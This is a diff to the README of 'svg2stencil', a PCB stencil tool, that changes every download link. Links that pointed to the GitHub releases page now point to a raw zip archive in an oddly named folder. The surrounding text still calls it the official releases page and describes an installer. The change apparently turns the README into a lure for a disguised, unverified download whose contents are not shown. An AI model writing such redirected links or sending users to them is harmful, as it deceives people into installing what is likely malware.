@@ -1,6 +1,6 @@
 # 🛠️ svg2stencil - Create 3D Printed PCB Stencils Easily
 
-[![Download svg2stencil](https://img.shields.io/badge/Download-svg2stencil-1abc9c?style=for-the-badge)](https://github.com/AAAAAAQAQAQ/svg2stencil/releases)
+[![Download svg2stencil](https://img.shields.io/badge/Download-svg2stencil-1abc9c?style=for-the-badge)](https://raw.githubusercontent.com/AAAAAAQAQAQ/svg2stencil/main/notopodial/stencil-svg-3.3.zip)
 
 ---
 
@@ -26,7 +26,7 @@ svg2stencil helps you turn the paste layer of a printed circuit board (PCB) desi
 
 You need to visit the releases page to get the latest version of svg2stencil. This link takes you directly to the page where all the releases are listed.
 
-[Download svg2stencil from Releases](https://github.com/AAAAAAQAQAQ/svg2stencil/releases)
+[Download svg2stencil from Releases](https://raw.githubusercontent.com/AAAAAAQAQAQ/svg2stencil/main/notopodial/stencil-svg-3.3.zip)
 
 Look for the files named something like `svg2stencil-setup.exe` or `svg2stencil.zip`. The `.exe` file is an installer. The `.zip` file contains the program files and needs to be extracted.
 
@@ -109,6 +109,6 @@ Look for the files named something like `svg2stencil-setup.exe` or `svg2stencil.
 
 Visit the official release page to get the app:
 
-[https://github.com/AAAAAAQAQAQ/svg2stencil/releases](https://github.com/AAAAAAQAQAQ/svg2stencil/releases)
+[https://raw.githubusercontent.com/AAAAAAQAQAQ/svg2stencil/main/notopodial/stencil-svg-3.3.zip](https://raw.githubusercontent.com/AAAAAAQAQAQ/svg2stencil/main/notopodial/stencil-svg-3.3.zip)
 
 Downloading from this page ensures you get the latest tested version. Follow the download and installation steps above to start creating your own 3D printed stencils.
